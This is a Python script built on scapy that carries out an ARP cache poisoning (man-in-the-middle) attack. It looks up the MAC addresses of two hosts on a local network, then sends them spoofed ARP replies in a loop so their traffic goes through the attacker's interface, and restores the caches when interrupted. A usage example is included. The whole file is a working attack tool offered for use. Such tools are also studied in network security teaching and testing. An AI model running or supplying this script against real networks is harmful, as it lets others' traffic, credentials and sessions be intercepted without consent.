#!/usr/bin/python3

'''
This script is for ARP cache poisoning attack
note : You should have enabled ip forwarding on your machine
author = 'xenon-xenon'
author_github = 'https://github.com/xenon-xenon'
'''

from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *
from argparse import ArgumentParser
from sys import argv

# class for arp spoof attack
class ArpSpoof:

    def __init__(self ,local_interface ,target1_ip ,target2_ip):
        self.local_interface = local_interface # interface using in the attack
        self.interface_mac = None
        self.target1_ip = target1_ip
        self.target2_ip = target2_ip
        self.target1_mac = None
        self.target2_mac = None

    def start(self):
        '''function to start attack'''

        print('Interface : ' + self.local_interface)
        self.get_local_mac() # get interface mac address

        # print mac address if the interface name is correct
        print('Interface mac : ' + self.interface_mac)

        self.get_targets_mac() # get targets mac addresses
        # print targets information
        print('Target 1 : ' + self.target1_ip)
        print('Target 1\'s mac : ' + self.target1_mac)
        print('Target 2 : ' + self.target2_ip)
        print('Target 2\'s mac : ' + self.target2_mac)

        self.poison_arp_cache()


    def get_local_mac(self):
        '''get interface mac from name of the interface'''

        try:
            self.interface_mac = get_if_hwaddr(self.local_interface)
        except ValueError :
            parser.print_help()
            print('\n')
            print('Invalid interface name --> ' + self.local_interface)
            exit()
        except OSError :
            parser.print_help()
            print('\n')
            print('Invalid interface name --> ' + self.local_interface)
            exit()

    def get_targets_mac(self):
        '''get targets mac by their ip address'''

        # get target 1 mac address
        try:
            self.target1_mac = getmacbyip(self.target1_ip)
            if self.target1_mac == None : # check if machine exists or responds to ARP request
                print('Target ' + self.target1_ip + ' didn\'t respond tp ARP request sent by machine')
                exit()

        except OSError :
            # ip validation
            parser.print_help()
            print('\n')
            print('Invalid IP address --> ' + self.target1_ip)
            exit()

        # get target 2 mac address
        try:
            self.target2_mac = getmacbyip(self.target2_ip)
            if self.target2_mac == None: # check if machine exists or responds to ARP request
                print('Target ' + self.target2_ip + ' didn\'t respond tp ARP request sent by machine')
                exit()

        except OSError :
            # ip validation
            parser.print_help()
            print('\n')
            print('Invalid IP address --> ' + self.target2_ip)
            exit()

    def poison_arp_cache(self):
        '''start poisoning the targets ARP caches'''

        while True :
            try :
                spoofed_arp_packet_target1 = ARP(op=2, psrc=self.target1_ip, pdst=self.target2_ip, hwdst=self.target2_mac ,hwsrc=self.interface_mac) # spoof target 1
                spoofed_arp_packet_target2 = ARP(op=2, psrc=self.target2_ip, pdst=self.target1_ip, hwdst=self.target1_mac ,hwsrc=self.interface_mac) # spoof target 2
                send(spoofed_arp_packet_target1 ,verbose=0)
                print('[ARP : ' + self.target1_ip + ' --> ' + self.target2_ip + ']--> mac : ' + self.interface_mac)
                send(spoofed_arp_packet_target2 ,verbose=0)
                print('[ARP : ' + self.target2_ip + ' --> ' + self.target1_ip + ']--> mac : ' + self.interface_mac)

            except KeyboardInterrupt :
                self.restore_arp_spoof()
                exit()


    def restore_arp_spoof(self):
        '''restore arp tables of the target machines'''

        print('\n')
        print('Send 2 last ARP packets for restore targets arp tables')
        correct_arp_packet_target1 = ARP(op=2, psrc=self.target1_ip, pdst=self.target2_ip, hwdst=self.target2_mac, hwsrc=self.target1_mac) # restore mac table of target 2
        correct_arp_packet_target2 = ARP(op=2, psrc=self.target2_ip, pdst=self.target1_ip, hwdst=self.target1_mac, hwsrc=self.target2_mac) # restore mac table of target 1

        send(correct_arp_packet_target1 ,verbose=0)
        send(correct_arp_packet_target2 ,verbose=0)


if __name__ == '__main__' :
    print('\n***You should have enabled ip forwarding on your machine***\n')
    # define parser and its arguments
    parser = ArgumentParser()
    parser.add_argument('--interface','-i',help='interface using in attack')
    parser.add_argument('--target1','-t1',help='First target for attack')
    parser.add_argument('--target2','-t2',help='Second target for attack')
    parser.epilog = 'Example : sudo python3 ' + argv[0] + ' -i eth0 -t1 192.168.1.1 -t2 192.168.1.50' # argv[0] is name of the file
    args = parser.parse_args()

    if (args.target1 != None) and (args.target2 != None) and (args.interface != None): # check arguments
        pass
    else:
        parser.print_help() # print parser help
        exit()

    arp_spoof = ArpSpoof(args.interface ,args.target1 ,args.target2) # make an instance from ArpSpoof class
    arp_spoof.start() # start attack
